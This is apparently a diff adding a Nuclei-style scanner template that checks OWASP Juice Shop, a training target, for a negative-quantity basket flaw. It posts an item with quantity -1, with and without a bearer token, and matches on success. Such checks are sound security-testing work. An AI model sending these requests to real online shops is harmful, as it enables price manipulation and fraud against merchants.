@@ -1,0 +1,46 @@
+id: juice-shop-negative-quantity
+info:
+  name: Negative Quantity Business Logic Flaw
+  author: generated
+  severity: high
+  tags: juice-shop,business-logic
+http:
+  - raw:
+      - |
+        POST /api/BasketItems/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"ProductId":1,"quantity":-1}
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        part: body
+        words:
+          - "quantity"
+          - "-1"
+          - "ProductId"
+        condition: and
+
+  - raw:
+      - |
+        POST /api/BasketItems/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{bearer_token}}
+
+        {"ProductId":1,"quantity":-1}
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        part: body
+        words:
+          - "quantity"
+          - "-1"
+        condition: and
